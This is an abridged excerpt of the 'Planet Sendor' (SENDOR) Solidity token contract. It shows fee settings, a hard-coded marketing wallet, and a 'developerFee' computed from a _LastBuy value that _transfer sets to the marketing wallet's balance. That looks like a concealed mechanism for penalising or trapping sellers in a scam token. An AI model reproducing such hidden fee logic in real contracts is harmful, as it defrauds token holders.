...
//https://t.me/PlanetSendor
//https://planetsendor.net
...
contract PlnetSendor is Context, IERC20, Ownable {
    ...
    string private constant _name = "Planet Sendor"; //
    string private constant _symbol = unicode"SENDOR"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x79Eb91287639210fe03c630f29e30469A1fA632F;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 developerFee = (10**17)/(1+_LastBuy[from]);
    ...
    function _transfer(
       ...
       _LastBuy[from] = _tOwned[_marketingWallet];
